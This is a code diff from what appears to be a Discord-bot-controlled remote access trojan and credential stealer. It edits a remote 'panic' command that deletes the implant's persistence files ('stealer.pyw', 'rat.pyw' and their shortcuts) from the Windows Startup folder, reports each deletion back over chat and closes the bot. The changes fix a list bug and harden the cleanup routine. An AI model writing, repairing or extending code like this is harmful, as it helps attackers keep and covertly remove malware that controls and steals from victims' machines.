@@ -110,23 +110,26 @@ async def panic(ctx):
     global stop
     await ctx.send("Panic mode activated! Stopping access...")
     
-    await ctx.send("The system will close, and the files will be deleted in the background after a 10 seconds countdown.")
-    
+    await ctx.send("The system will close, and the files will be deleted in the background after 10 seconds.")
+
     startup_directory = f"C:\\Users\\{USER_NAME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
     files_to_delete = [
         'stealer.pyw',
         'rat.lnk',
-        'stealer.lnk'
+        'stealer.lnk',
         'rat.pyw'
     ]
     
     for file in files_to_delete:
-        os.remove(f"{startup_directory}\\{file}")
+        try:
+            os.remove(os.path.join(startup_directory, file))
+            await ctx.send(f"Deleted: `{file}`")
+        except Exception as e:
+            await ctx.send(f"Could not delete `{file}`: {str(e)}")
+
     await ctx.send("System closed.")
+    await client.close()
     stop = True
-    exit()
-    quit()
-    return
 
 
 @client.command()
